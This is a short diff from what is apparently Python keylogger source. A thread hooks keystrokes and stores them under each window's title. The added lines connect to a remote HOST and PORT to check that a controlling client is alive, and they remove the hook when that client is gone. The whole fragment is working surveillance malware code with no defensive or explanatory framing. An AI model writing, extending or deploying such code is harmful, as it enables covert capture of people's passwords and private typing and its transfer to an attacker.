@@ -145,6 +145,14 @@ class Key(threading.Thread):
                 else:
                     hooked[GetWindowTitle()] = self.updateKey(ord(chr(lParam[0]).lower()))
 
+        # check if client is alive
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((HOST, PORT))
+        except:
+            self.keyLogger.uninstallHookProc()
+            return 'clientTerminated'
+
         # stop keylogging
         global loggingState
         if not loggingState:
